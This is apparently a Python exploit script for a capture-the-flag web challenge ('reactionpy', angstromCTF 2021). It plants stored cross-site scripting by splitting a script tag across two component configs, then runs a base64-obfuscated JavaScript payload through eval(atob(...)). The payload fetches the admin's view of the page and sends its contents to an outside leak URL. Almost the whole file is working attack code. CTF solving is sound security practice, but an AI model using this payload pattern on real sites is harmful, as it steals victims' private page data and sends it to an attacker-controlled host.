import requests
from base64 import b64encode

PROXIES = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
}

URL = 'https://reactionpy.2021.chall.actf.co'
LEAK_URL = 'http://[REDACTED]'
# LEAK_URL = URL

USER, PASS = 'aKKsdfa345asdf', '23452#@#daZ34@#$%5'

PAYLOAD = b64encode(f'''fetch('/?fakeuser=admin',).then(x=>x.text()).then(x=>fetch('{LEAK_URL}/?data='+btoa(x)));'''.encode()).decode()
# PAYLOAD = b64encode('console.log(12341234123)'.encode()).decode()
PAYLOAD = f'eval(atob(`{PAYLOAD}`));'
# PAYLOAD = f'console.log(1234);'

WELCOME = False

print(PAYLOAD)

s = requests.Session()
s.post(f'{URL}/login', data={'username': USER, 'pw': PASS}, proxies=PROXIES, verify=False)
# s.post(f'{URL}/register', data={'username': USER, 'pw': PASS}, proxies=PROXIES, verify=False)

s.post(f'{URL}/reset', proxies=PROXIES, verify=False)
if WELCOME:
	s.post(f'{URL}/newcomp', data={'name': 'welcome', 'cfg': 'asdfasd'}, proxies=PROXIES, verify=False)
else:
	s.post(f'{URL}/newcomp', data={'name': 'freq', 'cfg': '<script>/*'}, proxies=PROXIES, verify=False)
	s.post(f'{URL}/newcomp', data={'name': 'text', 'cfg': f'*/\n{PAYLOAD}//'}, proxies=PROXIES, verify=False)

